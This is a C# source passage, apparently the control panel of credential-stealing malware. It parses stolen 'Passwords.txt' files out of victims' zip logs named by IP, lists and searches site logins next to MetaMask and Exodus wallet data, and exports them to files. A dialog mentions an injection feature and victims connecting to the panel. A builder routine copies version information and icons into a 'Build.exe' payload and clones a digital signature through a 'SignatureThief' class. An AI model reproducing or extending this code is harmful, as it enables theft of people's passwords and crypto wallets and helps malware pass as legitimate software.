                Directory.CreateDirectory(tempDir);

                // Collection optimized for large data
                ConcurrentBag<CredentialData> allPasswords = new ConcurrentBag<CredentialData>();
                int totalProcessed = 0;

                try
                {
                    // Process in chunks to manage memory
                    int chunkSize = 10;
                    for (int i = 0; i < zipFiles.Length; i += chunkSize)
                    {
                        // Process a chunk of files
                        await Task.Run(() =>
                        {
                            int currentChunkSize = Math.Min(chunkSize, zipFiles.Length - i);
                            var currentChunk = zipFiles.Skip(i).Take(currentChunkSize).ToArray();

                            Parallel.ForEach(currentChunk, new ParallelOptions
                            {
                                MaxDegreeOfParallelism = Math.Max(1, Environment.ProcessorCount / 2)
                            }, zipFile =>
                            {
                                try
                                {
                                    string ip = Path.GetFileNameWithoutExtension(zipFile);
                                    string extractPath = Path.Combine(tempDir, Path.GetRandomFileName());
                                    Directory.CreateDirectory(extractPath);

                                    using (System.IO.Compression.ZipArchive archive = System.IO.Compression.ZipFile.OpenRead(zipFile))
                                    {
                                        // Find all password files
                                        var passwordFiles = archive.Entries.Where(entry =>
                                            entry.Name.Equals("Passwords.txt", StringComparison.OrdinalIgnoreCase) ||
                                            entry.FullName.EndsWith("/Passwords.txt", StringComparison.OrdinalIgnoreCase) ||
                                            entry.FullName.EndsWith("\\Passwords.txt", StringComparison.OrdinalIgnoreCase)
                                        ).ToList();

                                        if (passwordFiles.Count > 0)
                                        {
                                            LogError($"Found {passwordFiles.Count} password files in {ip}.zip");

                                            foreach (var passwordFile in passwordFiles)
                                            {
                                                try
                                                {
                                                    // Extract the password file
                                                    string outputPath = Path.Combine(extractPath, "Passwords_" + Guid.NewGuid().ToString().Substring(0, 8) + ".txt");
                                                    passwordFile.ExtractToFile(outputPath, true);

                                                    // Parse in batches to avoid memory issues
                                                    using (StreamReader reader = new StreamReader(outputPath))
                                                    {
                                                        const int readBufferSize = 64 * 1024; // 64KB buffer
                                                        char[] buffer = new char[readBufferSize];
                                                        StringBuilder contentBuilder = new StringBuilder();
                                                        int bytesRead;

                                                        while ((bytesRead = reader.Read(buffer, 0, buffer.Length)) > 0)
                                                        {
                                                            contentBuilder.Append(buffer, 0, bytesRead);

                                                            // Process if buffer is getting large
                                                            if (contentBuilder.Length > 1024 * 1024) // 1MB
                                                            {
                                                                string content = contentBuilder.ToString();
                                                                var entries = ParsePasswordFileContent(content, ip);

                                                                if (entries != null)
                                                                {
                                                                    foreach (var pe in entries)
                                                                    {
                                                                        allPasswords.Add(new CredentialData
                                                                        {
                                                                            Website = pe.Website,
                                                                            Username = pe.Username,
                                                                            Password = pe.Password,
                                                                            Dispose = ""
                                                                        });
                                                                    }
                                                                }

                                                                // Clear builder but keep any partial entry
                                                                int lastNewLine = content.LastIndexOf('\n');
                                                                if (lastNewLine >= 0)
                                                                {
                                                                    contentBuilder.Clear();
                                                                    contentBuilder.Append(content.Substring(lastNewLine + 1));
                                                                }
                                                            }
                                                        }

                                                        // Process any remaining content
                                                        if (contentBuilder.Length > 0)
                                                        {
                                                            var entries = ParsePasswordFileContent(contentBuilder.ToString(), ip);
                                                            if (entries != null)
                                                            {
                                                                foreach (var pe in entries)
                                                                {
                                                                    allPasswords.Add(new CredentialData
                                                                    {
                                                                        Website = pe.Website,
                                                                        Username = pe.Username,
                                                                        Password = pe.Password,
                                                                        Dispose = ""
                                                                    });
                                                                }
                                                            }
                                                        }
                                                    }

                                                    // Clean up extracted file
                                                    try { File.Delete(outputPath); } catch { }
                                                }
                                                catch (Exception ex)
                                                {
                                                    LogError($"Error extracting or parsing password file from {ip}: {ex.Message}");
                                                }
                                            }
                                        }
                                    }

                                    // Clean up extraction directory for this IP
                                    try { Directory.Delete(extractPath, true); } catch { }
                                }
                                catch (Exception ex)
                                {
                                    LogError($"Error processing {zipFile}: {ex.Message}");
                                }
                            });

                            Interlocked.Add(ref totalProcessed, currentChunkSize);
                        });

                        // Force GC collection between chunks to manage memory
                        GC.Collect();
                        await Task.Delay(10); // Let UI refresh
                    }

                    LogError($"Processed {totalProcessed} zip files. Found {allPasswords.Count} passwords.");

                    // Convert ConcurrentBag to List for data binding
                    // Use batching for extremely large sets
                    const int maxItemsPerBatch = 100000; // Limit initial display
                    var dataList = allPasswords.Take(maxItemsPerBatch).ToList();

                    // Set data source for the grid with optimized settings
                    gridControl6.BeginUpdate();

                    if (gridControl6.MainView is GridView gridView)
                    {
                        // Optimize grid performance for large datasets
                        gridView.OptionsBehavior.Editable = false;
                        gridView.OptionsView.ShowGroupPanel = false;
                        gridView.OptionsView.ShowFilterPanelMode = DevExpress.XtraGrid.Views.Base.ShowFilterPanelMode.Never;
                        gridView.OptionsView.ShowFooter = false;
                        gridView.OptionsView.ColumnAutoWidth = false;

                        // Virtual mode for large datasets
                        gridView.OptionsView.EnableAppearanceEvenRow = false;
                        gridView.OptionsView.EnableAppearanceOddRow = false;

                        // Disable animations
                        gridView.OptionsCustomization.AllowFilter = false;
                        gridView.OptionsMenu.EnableColumnMenu = false;

                        // Disable row indicator to improve performance
                        gridView.OptionsView.ShowIndicator = false;
                    }

                    gridControl6.DataSource = dataList;
                    gridControl6.EndUpdate();

                    // Update status with info about data limits if needed
                    int totalFound = allPasswords.Count;
                    label94.Text = $"{totalFound}";

                    if (totalFound > maxItemsPerBatch)
                    {
                        MessageBox.Show($"Found {totalFound} passwords. Displaying first {maxItemsPerBatch} for performance reasons.",
                            "Large Dataset", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                    else if (totalFound == 0)
                    {
                        MessageBox.Show("No passwords found in any client files.", "Search Complete", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Error: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    LogError($"simpleButton8_Click error: {ex.Message}");
                }
                finally
                {
                    // Clean up temp directory
                    try { Directory.Delete(tempDir, true); } catch { }
                    simpleButton8.Enabled = true;
                    CleanupMemory();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Outer error: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                LogError($"simpleButton8_Click outer error: {ex.Message}");
                simpleButton8.Enabled = true;
            }
        }
        public class CredentialData
        {
            public string Website { get; set; }
            public string Username { get; set; }
            public string Password { get; set; }
            public string Dispose { get; set; }
        }
        // Helper class to store password entries
        private class PasswordEntry
        {
            public string Website { get; set; }
            public string Username { get; set; }
            public string Password { get; set; }
            public string Browser { get; set; }
            public string ClientIP { get; set; }

            public PasswordEntry(string website, string username, string password, string browser, string clientIP)
            {
                Website = website ?? "Unknown";
                Username = username ?? "Unknown";
                Password = password ?? "Unknown";
                Browser = browser ?? "Unknown";
                ClientIP = clientIP;
            }
        }

        // Helper method to parse the password file content in the specific format provided
        private List<PasswordEntry> ParsePasswordFileContent(string content, string clientIP)
        {
            List<PasswordEntry> entries = new List<PasswordEntry>();

            // Split the content into groups of entries
            // Each entry starts with "URL:" and ends before the next "URL:" or end of file
            string[] lines = content.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);

            string currentUrl = null;
            string currentUsername = null;
            string currentPassword = null;
            string currentBrowser = null;

            for (int i = 0; i < lines.Length; i++)
            {
                string line = lines[i].Trim();

                if (line.StartsWith("URL:", StringComparison.OrdinalIgnoreCase))
                {
                    // If we have a complete entry from before, add it to the list
                    if (currentUrl != null && currentPassword != null)
                    {
                        entries.Add(new PasswordEntry(
                            currentUrl,
                            currentUsername ?? "UNKNOWN",
                            currentPassword,
                            currentBrowser ?? "Unknown",
                            clientIP
                        ));
                    }

                    // Start a new entry
                    currentUrl = line.Substring(4).Trim();
                    currentUsername = null;
                    currentPassword = null;
                    currentBrowser = null;
                }
                else if (line.StartsWith("Username:", StringComparison.OrdinalIgnoreCase))
                {
                    currentUsername = line.Substring(9).Trim();
                }
                else if (line.StartsWith("Password:", StringComparison.OrdinalIgnoreCase))
                {
                    currentPassword = line.Substring(9).Trim();
                }
                else if (line.StartsWith("Browser:", StringComparison.OrdinalIgnoreCase))
                {
                    currentBrowser = line.Substring(8).Trim();

                    // If we have a complete entry and the browser is the last field, add it now
                    if (currentUrl != null && currentPassword != null)
                    {
                        entries.Add(new PasswordEntry(
                            currentUrl,
                            currentUsername ?? "UNKNOWN",
                            currentPassword,
                            currentBrowser,
                            clientIP
                        ));

                        // Reset for next entry
                        currentUrl = null;
                        currentUsername = null;
                        currentPassword = null;
                        currentBrowser = null;
                    }
                }
            }

            // Add the last entry if there's one that wasn't added yet
            if (currentUrl != null && currentPassword != null)
            {
                entries.Add(new PasswordEntry(
                    currentUrl,
                    currentUsername ?? "UNKNOWN",
                    currentPassword,
                    currentBrowser ?? "Unknown",
                    clientIP
                ));
            }

            return entries;
        }

        private void simpleButton10_Click(object sender, EventArgs e)
        {
            try
            {
                // Clear only GridControl6
                if (gridControl6.DataSource is List<CredentialData> dataSource)
                {
                    dataSource.Clear();
                }
                else
                {
                    gridControl6.DataSource = new List<CredentialData>();
                }

                // Refresh the grid
                gridControl6.RefreshDataSource();

                // Reset password counter label
                label94.Text = "0";

                // Show confirmation to user
                MessageBox.Show("Password data has been cleared.", "Clear Complete", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error clearing password data: {ex.Message}", "Clear Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                LogError($"simpleButton10_Click error: {ex.Message}");
            }
        }

        private void simpleButton9_Click(object sender, EventArgs e)
        {
            try
            {
                // Get the search term from textEdit2
                string searchWebsite = textEdit2.Text.Trim();

                // Check if search term is empty
                if (string.IsNullOrWhiteSpace(searchWebsite))
                {
                    MessageBox.Show("Please enter a website to search for.", "Search Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    return;
                }

                // Normalize the search term to improve matching
                searchWebsite = NormalizeUrl(searchWebsite);
                if (string.IsNullOrWhiteSpace(searchWebsite))
                {
                    MessageBox.Show("Invalid website format.", "Search Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    return;
                }

                // Check if gridControl6 has data
                if (!(gridControl6.DataSource is List<CredentialData> dataSource) || dataSource.Count == 0)
                {
                    MessageBox.Show("No passwords have been loaded yet. Please load passwords first.", "Search Error", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    return;
                }

                // Set cursor to wait
                Cursor = Cursors.WaitCursor;

                // Create a list to store matching items
                List<CredentialData> matchingItems = new List<CredentialData>();

                // Search through all items in the data source
                foreach (var item in dataSource)
                {
                    // Get the website from the data
                    string website = item.Website;

                    // Normalize the website from the list for comparison
                    string normalizedWebsite = NormalizeUrl(website);

                    // Check if the normalized website contains the search term
                    if (!string.IsNullOrEmpty(normalizedWebsite) &&
                        normalizedWebsite.Contains(searchWebsite))
                    {
                        // Add to matching items
                        matchingItems.Add(new CredentialData
                        {
                            Website = item.Website,
                            Username = item.Username,
                            Password = item.Password,
                            Dispose = item.Dispose
                        });
                    }
                }

                // Check if we found any matches
                if (matchingItems.Count > 0)
                {
                    // Replace the data source with only the matching items
                    gridControl6.DataSource = matchingItems;
                    gridControl6.RefreshDataSource();

                    MessageBox.Show($"Found {matchingItems.Count} matches for '{textEdit2.Text}'", "Search Results", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                else
                {
                    MessageBox.Show($"No matches found for '{textEdit2.Text}'", "Search Results", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error during search: {ex.Message}", "Search Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                LogError($"simpleButton9_Click error: {ex.Message}");
            }
            finally
            {
                // Reset cursor
                Cursor = Cursors.Default;
            }
        }
        private string NormalizeUrl(string url)
        {
            if (string.IsNullOrWhiteSpace(url))
                return string.Empty;

            // Remove common prefixes
            url = url.ToLower().Trim();

            // Remove http:// or https:// prefix
            if (url.StartsWith("http://"))
                url = url.Substring(7);
            else if (url.StartsWith("https://"))
                url = url.Substring(8);

            // Remove www. prefix if present
            if (url.StartsWith("www."))
                url = url.Substring(4);

            // Remove trailing slash
            if (url.EndsWith("/"))
                url = url.Substring(0, url.Length - 1);

            // Remove everything after the first / (path component)
            int slashIndex = url.IndexOf('/');
            if (slashIndex > 0)
                url = url.Substring(0, slashIndex);

            return url;
        }

        // Add this method to allow restoring the original list
        private void RestoreAllPasswords()
        {
            // This would typically be called from another button click or action
            // You would need to either cache the original list or reload it from the files

            // Example implementation assuming you have a method to reload all passwords
            simpleButton8_Click(this, EventArgs.Empty);
        }

        private void simpleButton6_Click(object sender, EventArgs e)
        {
            try
            {
                // Clear GridControl4
                if (gridControl4.DataSource is List<WalletData> dataSource4)
                {
                    dataSource4.Clear();
                }
                else
                {
                    gridControl4.DataSource = new List<WalletData>();
                }

                // Clear GridControl5
                if (gridControl5.DataSource is List<WalletData> dataSource5)
                {
                    dataSource5.Clear();
                }
                else
                {
                    gridControl5.DataSource = new List<WalletData>();
                }

                // Clear GridControl6
                if (gridControl6.DataSource is List<CredentialData> dataSource6)
                {
                    dataSource6.Clear();
                }
                else
                {
                    gridControl6.DataSource = new List<CredentialData>();
                }

                // Refresh all grids
                gridControl4.RefreshDataSource();
                gridControl5.RefreshDataSource();
                gridControl6.RefreshDataSource();

                // Reset any counter labels if needed
                label94.Text = "0";  // Password counter
                label95.Text = "0";  // Exodus counter
                label96.Text = "0";  // MetaMask counter

                // Show confirmation to user
                MessageBox.Show("All data has been cleared.", "Clear Complete", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error clearing data: {ex.Message}", "Clear Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                LogError($"simpleButton6_Click error: {ex.Message}");
            }
        }

        private void simpleButton7_Click(object sender, EventArgs e)
        {
            try
            {
                // Show confirmation dialog with exclamation icon
                DialogResult result = MessageBox.Show(
                    "This will reset client data and restart the application. Are you sure you want to proceed?",
                    "Confirm Reset",
                    MessageBoxButtons.YesNo,
                    MessageBoxIcon.Exclamation
                );

                // Check if user clicked Yes
                if (result == DialogResult.Yes)
                {
                    // Define path to ClientData.txt
                    string filePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "ClientData.txt");

                    // Delete the file if it exists
                    if (File.Exists(filePath))
                    {
                        File.Delete(filePath);
                    }

                    // Prepare to restart the application
                    string appPath = Application.ExecutablePath;

                    // Create process start info
                    ProcessStartInfo startInfo = new ProcessStartInfo
                    {
                        FileName = appPath,
                        UseShellExecute = true
                    };

                    // Start the new instance
                    Process.Start(startInfo);

                    // Close the current instance
                    Application.Exit();
                }
                // If No was clicked, do nothing (function will end)
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error during reset: {ex.Message}", "Reset Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                LogError($"simpleButton7_Click error: {ex.Message}");
            }
        }

        private void accordionControlElement10_Click(object sender, EventArgs e)
        {
            xtraTabControl1.SelectedTabPageIndex = 4;
        }

        private void accordionControlElement11_Click(object sender, EventArgs e)
        {
            xtraTabControl1.SelectedTabPageIndex = 5;
        }

        private void checkEdit1_CheckedChanged(object sender, EventArgs e)
        {






        }

        private void checkEdit2_CheckedChanged(object sender, EventArgs e)
        {








        }

        private void checkEdit1_CheckedChanged_1(object sender, EventArgs e)
        {





            if (checkEdit1.Checked == true)
            {

                DialogResult result = MessageBox.Show(
   "Warning: Enabling the injection feature will take additional time to get victim connect to the panel [ 1-3 minutes sleep ]",  // Message text
   "Confirmation",                             // Title
   MessageBoxButtons.YesNo,                    // Button options
   MessageBoxIcon.Warning                     // Icon
);

                // Check which button was clicked
                if (result == DialogResult.Yes)
                {
                    checkEdit1.Checked = true;
                }
                else // result == DialogResult.No
                {

                    checkEdit1.Checked = false;
                }

            }
            else
            {
                checkEdit1.Checked = false;

            }

        }

        private void Form1_LocationChanged(object sender, EventArgs e)
        {

        }

        private void simpleButton4_Click(object sender, EventArgs e)
        {
            // instead let him select from disk by running opendialog, so he can select clientfolder scan there or choose  zip file manually
        }

        private void simpleButton3_Click(object sender, EventArgs e)
        {

        }


        private void simpleButton2_Click_1(object sender, EventArgs e)
        {
            try
            {
                // Disable the button to prevent multiple clicks
                simpleButton2.Enabled = false;
                Cursor = Cursors.WaitCursor;

                // Create SavedLogs directory if it doesn't exist
                string savedLogsFolder = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "SavedLogs");
                if (!Directory.Exists(savedLogsFolder))
                {
                    Directory.CreateDirectory(savedLogsFolder);
                }

                // Generate unique filenames with timestamps
                string timestamp = DateTime.Now.ToString("yyyyMMdd_HHmmss");
                string metamaskFile = Path.Combine(savedLogsFolder, $"MetaMask_Wallets_{timestamp}.txt");
                string exodusFile = Path.Combine(savedLogsFolder, $"Exodus_Wallets_{timestamp}.txt");
                string passwordsFile = Path.Combine(savedLogsFolder, $"Passwords_{timestamp}.txt");

                // Counter for total saved items
                int totalSaved = 0;

                // Save GridControl4 (MetaMask wallets)
                int metamaskCount = SaveGridToFile(gridControl4, metamaskFile);
                totalSaved += metamaskCount;

                // Save GridControl5 (Exodus wallets)
                int exodusCount = SaveGridToFile(gridControl5, exodusFile);
                totalSaved += exodusCount;

                // Save GridControl6 (Passwords)
                int passwordsCount = SaveGridToFile(gridControl6, passwordsFile);
                totalSaved += passwordsCount;

                // Show completion message
                MessageBox.Show(
                    $"Successfully saved all logs to the SavedLogs folder:\n\n" +
                    $"MetaMask Wallets: {metamaskCount} entries\n" +
                    $"Exodus Wallets: {exodusCount} entries\n" +
                    $"Passwords: {passwordsCount} entries\n\n" +
                    $"Total items saved: {totalSaved}",
                    "Save Complete",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error saving logs: {ex.Message}", "Save Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                LogError($"simpleButton2_Click_1 error: {ex.Message}");
            }
            finally
            {
                // Re-enable the button and restore cursor
                simpleButton2.Enabled = true;
                Cursor = Cursors.Default;
            }
        }

        private int SaveGridToFile(GridControl grid, string filePath)
        {
            int count = 0;

            try
            {
                // Create a FileStream with a buffer for efficient writing
                using (FileStream fs = new FileStream(filePath, FileMode.Create, FileAccess.Write, FileShare.None, 64 * 1024))
                using (StreamWriter writer = new StreamWriter(fs, Encoding.UTF8))
                {
                    // Write header line
                    if (grid.MainView is GridView gridView)
                    {
                        List<string> headers = new List<string>();
                        foreach (GridColumn column in gridView.Columns)
                        {
                            if (column.Visible)
                            {
                                headers.Add(column.Caption);
                            }
                        }
                        writer.WriteLine(string.Join("\t", headers));
                    }

                    // Process data in batches for memory efficiency
                    if (grid.DataSource is IEnumerable dataSource)
                    {
                        const int batchSize = 10000;
                        List<object> batch = new List<object>(batchSize);

                        // Reflections method to avoid loading the entire dataset at once
                        foreach (var item in dataSource)
                        {
                            batch.Add(item);
                            count++;

                            if (batch.Count >= batchSize)
                            {
                                WriteItemsToFile(batch, writer, grid);
                                batch.Clear();

                                // Force garbage collection on large datasets
                                if (count % 100000 == 0)
                                {
                                    GC.Collect();
                                }
                            }
                        }

                        // Write any remaining items
                        if (batch.Count > 0)
                        {
                            WriteItemsToFile(batch, writer, grid);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                LogError($"Error saving grid to {filePath}: {ex.Message}");
                throw; // Re-throw to be handled by the calling method
            }

            return count;
        }
        private void WriteItemsToFile(List<object> items, StreamWriter writer, GridControl grid)
        {
            if (grid.MainView is GridView gridView)
            {
                foreach (var item in items)
                {
                    List<string> values = new List<string>();
                    foreach (GridColumn column in gridView.Columns)
                    {
                        if (column.Visible)
                        {
                            // Get property value using reflection based on the FieldName
                            string fieldName = column.FieldName;
                            PropertyInfo property = item.GetType().GetProperty(fieldName);

                            if (property != null)
                            {
                                object value = property.GetValue(item);
                                values.Add(value?.ToString() ?? "");
                            }
                            else
                            {
                                values.Add("");
                            }
                        }
                    }

                    // Write the line with tab separation
                    writer.WriteLine(string.Join("\t", values));
                }
            }
        }

        private void panelControl31_Paint(object sender, PaintEventArgs e)
        {

        }

        private void accordionControlElement12_Click(object sender, EventArgs e)
        {
            xtraTabControl1.SelectedTabPageIndex = 6;
        }

        private void xtraTabPage7_Paint(object sender, PaintEventArgs e)
        {

        }

        private void panelControl37_Paint(object sender, PaintEventArgs e)
        {

        }

        private void barEditItem2_EditValueChanged(object sender, EventArgs e)
        {

        }

        private void simpleButton14_Click_1(object sender, EventArgs e)
        {

            //textEdit7.Text
           if (File.Exists(Environment.CurrentDirectory + "\\Build.exe"))
            {
                textEdit7.Text = Environment.CurrentDirectory + "\\Build.exe";
            }
        }

        private void simpleButton16_Click(object sender, EventArgs e)
        {
            try
            {
                using (OpenFileDialog openFileDialog = new OpenFileDialog())
                {
                    openFileDialog.Title = "Select Icon File";
                    openFileDialog.Filter = "Icon Files (*.ico)|*.ico";

                    if (openFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        // Display the icon path in textEdit9
                        textEdit9.Text = openFileDialog.FileName;

                        // Display the icon in pictureBox5
                        pictureBox5.Image = new Icon(openFileDialog.FileName).ToBitmap();

                        // Set the sizing mode to stretch
                        pictureBox5.SizeMode = PictureBoxSizeMode.StretchImage;
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error selecting icon: " + ex.Message);
            }
        }

        private void simpleButton17_Click(object sender, EventArgs e)
        {
            try
            {
                using (OpenFileDialog openFileDialog = new OpenFileDialog())
                {
                    openFileDialog.Title = "Select Executable File";
                    openFileDialog.Filter = "Executable Files (*.exe)|*.exe";

                    if (openFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        string exePath = openFileDialog.FileName;
                        textEdit10.Text = exePath;

                        // Get assembly information from the selected executable
                        GetAssemblyInfo(exePath);
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error selecting executable: " + ex.Message);
            }
        }

        private T GetAssemblyAttribute<T>(Assembly assembly) where T : Attribute
        {
            object[] attributes = assembly.GetCustomAttributes(typeof(T), false);
            if (attributes != null && attributes.Length > 0)
                return (T)attributes[0];
            return null;
        }

        private void GetAssemblyInfo(string exePath)
        {
            try
            {
                // First try to get info using .NET reflection (for .NET assemblies)
                try
                {
                    Assembly assembly = Assembly.LoadFile(exePath);

                    // Get assembly attributes
                    AssemblyTitleAttribute titleAttr =
                        GetAssemblyAttribute<AssemblyTitleAttribute>(assembly);
                    AssemblyDescriptionAttribute descAttr =
                        GetAssemblyAttribute<AssemblyDescriptionAttribute>(assembly);
                    AssemblyConfigurationAttribute configAttr =
                        GetAssemblyAttribute<AssemblyConfigurationAttribute>(assembly);
                    AssemblyCompanyAttribute companyAttr =
                        GetAssemblyAttribute<AssemblyCompanyAttribute>(assembly);
                    AssemblyProductAttribute productAttr =
                        GetAssemblyAttribute<AssemblyProductAttribute>(assembly);
                    AssemblyCopyrightAttribute copyrightAttr =
                        GetAssemblyAttribute<AssemblyCopyrightAttribute>(assembly);
                    AssemblyTrademarkAttribute trademarkAttr =
                        GetAssemblyAttribute<AssemblyTrademarkAttribute>(assembly);

                    // Get version information
                    Version assemblyVersion = assembly.GetName().Version;

                    // Fill in the textboxes
                    textEdit11.Text = titleAttr?.Title ?? "";
                    textEdit12.Text = descAttr?.Description ?? "";
                    textEdit13.Text = configAttr?.Configuration ?? "";
                    textEdit14.Text = companyAttr?.Company ?? "";
                    textEdit15.Text = productAttr?.Product ?? "";
                    textEdit16.Text = copyrightAttr?.Copyright ?? "";
                    textEdit17.Text = trademarkAttr?.Trademark ?? "";
                    textEdit18.Text = assembly.GetType().GUID.ToString();

                    // Fill in version information textboxes
                    textEdit19.Text = assemblyVersion.Major.ToString();
                    textEdit20.Text = assemblyVersion.Minor.ToString();
                    textEdit21.Text = assemblyVersion.Build.ToString();
                    textEdit22.Text = assemblyVersion.Revision.ToString();

                    return; // Successfully got info via .NET reflection
                }
                catch (BadImageFormatException)
                {
                    // This is not a .NET assembly, continue to native method
                }

                // If we reach here, it's not a .NET assembly or reflection failed
                // Get version info using native methods (works for any EXE)
                FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(exePath);

                textEdit11.Text = versionInfo.InternalName ?? "";
                textEdit12.Text = versionInfo.FileDescription ?? "";
                textEdit13.Text = ""; // No configuration in native resources
                textEdit14.Text = versionInfo.CompanyName ?? "";
                textEdit15.Text = versionInfo.ProductName ?? "";
                textEdit16.Text = versionInfo.LegalCopyright ?? "";
                textEdit17.Text = versionInfo.LegalTrademarks ?? "";
                textEdit18.Text = ""; // No GUID in native resources

                // Parse and set version information
                if (!string.IsNullOrEmpty(versionInfo.FileVersion))
                {
                    // Parse the version string (format: major.minor.build.revision)
                    string[] versionParts = versionInfo.FileVersion.Split('.');

                    // Set each part, with fallback to "0" if not present
                    textEdit19.Text = versionParts.Length > 0 ? versionParts[0] : "0";
                    textEdit20.Text = versionParts.Length > 1 ? versionParts[1] : "0";
                    textEdit21.Text = versionParts.Length > 2 ? versionParts[2] : "0";
                    textEdit22.Text = versionParts.Length > 3 ? versionParts[3] : "0";
                }
                else
                {
                    // Default to all zeros if no version found
                    textEdit19.Text = "0";
                    textEdit20.Text = "0";
                    textEdit21.Text = "0";
                    textEdit22.Text = "0";
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error retrieving assembly information: " + ex.Message);

                // Set default "0" values for version fields in case of error
                textEdit19.Text = "0";
                textEdit20.Text = "0";
                textEdit21.Text = "0";
                textEdit22.Text = "0";
            }
        }
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr BeginUpdateResource(string pFileName, bool bDeleteExistingResources);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool UpdateResource(IntPtr hUpdate, string lpType, IntPtr lpName, ushort wLanguage, byte[] lpData, uint cbData);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool EndUpdateResource(IntPtr hUpdate, bool bDiscard);
        private void simpleButton18_Click(object sender, EventArgs e)
        {
            try
            {
                string targetExePath = textEdit7.Text;
                if (string.IsNullOrEmpty(textEdit7.Text))
                {
                    MessageBox.Show("Please select target executable (Build.exe) first.");
                    return;
                }

                // Create backup
                string backupPath = targetExePath + ".backup";
                File.Copy(targetExePath, backupPath, true);

                // Extract resource editor from embedded resources
                string resPath = Path.Combine(Environment.CurrentDirectory, "res.exe");
                File.WriteAllBytes(resPath, Properties.Resources.Res);

                // Validate input fields
                if (string.IsNullOrEmpty(textEdit10.Text) || string.IsNullOrEmpty(targetExePath))
                {
                    MessageBox.Show("Assembly source and target executable must be specified!",
                        "Information", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    return;
                }

                if (!File.Exists(textEdit10.Text) || !File.Exists(targetExePath))
                {
                    MessageBox.Show("Assembly source or target executable file does not exist!",
                        "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                if (!File.Exists(resPath))
                {
                    MessageBox.Show("Resource editor (res.exe) could not be extracted!",
                        "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                // Define output paths
                string tempAssemblyPath = Path.Combine(
                    Path.GetDirectoryName(targetExePath),
                    "temp_assembly_" + Path.GetFileName(targetExePath)
                );

                string tempIconPath = Path.Combine(
                    Path.GetDirectoryName(targetExePath),
                    "temp_icon_" + Path.GetFileName(targetExePath)
                );

                string tempSignaturePath = Path.Combine(
                    Path.GetDirectoryName(targetExePath),
                    "temp_signed_" + Path.GetFileName(targetExePath)
                );

                try
                {
                    // STEP 1: Apply assembly information changes
                    ExecuteResCommand($"-extract \"{textEdit10.Text}\", resources.res, VERSIONINFO,,");
                    ExecuteResCommand($"-delete \"{targetExePath}\", tempFile.exe, VERSIONINFO,,");
                    ExecuteResCommand($"-addoverwrite tempFile.exe, \"{tempAssemblyPath}\", resources.res, VERSIONINFO,,");

                    string currentFile = tempAssemblyPath;

                    // STEP 2: Apply icon if provided
                    bool iconApplied = false;
                    if (!string.IsNullOrEmpty(textEdit9.Text) &&
                        File.Exists(textEdit9.Text) &&
                        textEdit9.Text.EndsWith(".ico", StringComparison.OrdinalIgnoreCase))
                    {
                        IconInjector.InjectIcon(currentFile, textEdit9.Text);
                        iconApplied = true;
                    }

                    // STEP 3: Apply signature if source file is provided
                    bool signatureApplied = false;
                    if (!string.IsNullOrEmpty(textEdit8.Text) && File.Exists(textEdit8.Text))
                    {
                        signatureApplied = SignatureThief.CloneSignature(textEdit8.Text, currentFile, tempSignaturePath);
                        if (signatureApplied)
                        {
                            currentFile = tempSignaturePath;
                        }
                    }

                    // STEP 4: Copy final result to target path
                    File.Copy(currentFile, targetExePath, true);

                    // Success message
                    string message = "Build completed successfully!\n\n" +
                                     $"• Output: {targetExePath}\n" +
                                     "• Assembly info updated\n";

                    if (iconApplied)
                        message += "• Icon customization applied\n";

                    if (signatureApplied)
                        message += "• Digital signature cloned\n";
                    else if (!string.IsNullOrEmpty(textEdit8.Text) && File.Exists(textEdit8.Text))
                        message += "• Signature cloning failed\n";

                    message += $"\nA backup of the original file was created at:\n{backupPath}";

                    MessageBox.Show(message, "Build Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                finally
                {
                    // Clean up all temporary files
                    string[] filesToCleanup = new string[]
                    {
                "tempFile.exe",
                "resources.res",
                "res.exe",
                "Res.ini",
                "res.log",
                tempAssemblyPath,
                tempIconPath,
                tempSignaturePath
                    };

                    foreach (string file in filesToCleanup)
                    {
                        try
                        {
                            if (File.Exists(file))
                            {
                                File.Delete(file);
                            }
                        }
                        catch
                        {
                            // Ignore errors during cleanup
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error modifying executable: " + ex.Message,
                    "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

